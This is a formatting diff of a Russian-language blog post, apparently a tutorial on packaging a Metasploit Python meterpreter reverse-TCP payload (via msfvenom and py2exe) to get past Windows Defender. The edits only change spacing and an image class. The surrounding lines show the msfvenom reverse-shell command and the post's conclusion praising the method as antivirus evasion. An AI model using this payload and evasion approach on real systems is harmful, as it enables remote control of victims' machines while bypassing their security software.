@@ -44,12 +44,6 @@ python -3.4 –m pip install py2exe
 msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > payload.py
 ~~~
 
-
-
-
-<br><br>
-
-
 К коду необходимо добавить import getpass который msfvenom по умолчанию почему-то не делает.
 
 <br><br>
@@ -74,9 +68,10 @@ run
 
 И получаем коммандную оболочку:
 
-![Python_shell]({{ site.baseurl }}/rus/assets/img/posts_rus/python_shell.jpg){:class="img"}
+![Python_shell]({{ site.baseurl }}/rus/assets/img/posts_rus/python_shell.jpg){:class="imghalf"}
 
 # Заключение
 {:id="end"}
 
 Простой и эффективный способ борьбы с Windows Defender если не хочется терять удобный и привычный функционал meterpreter в угоду более нативным решениям, как например ssh или telnet. 
+<br>
